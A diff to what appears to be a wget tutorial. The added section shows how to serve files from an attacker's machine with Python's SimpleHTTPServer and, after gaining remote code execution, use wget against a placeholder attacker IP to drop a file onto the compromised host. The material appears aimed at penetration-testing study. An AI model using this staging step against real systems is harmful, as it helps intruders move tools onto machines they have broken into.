@@ -123,6 +123,16 @@ We'll use the  [Microshaft index page](https://www.microsoft.com/) for this exam
 ~~~
 wget https://www.microsoft.com/
 ~~~
+wget can also be use to serve files out bound for example, we'll use the default python server to make a directory an http server
+~~~
+python -m SimpleHTTPServer
+~~~ 
+
+and if we have code execution remotely, we can run something like
+
+~~~
+wget $attacking_Machine_IP:port/direcory -O /remoteDirectory/placingThe/filHere
+~~~
 
 
 
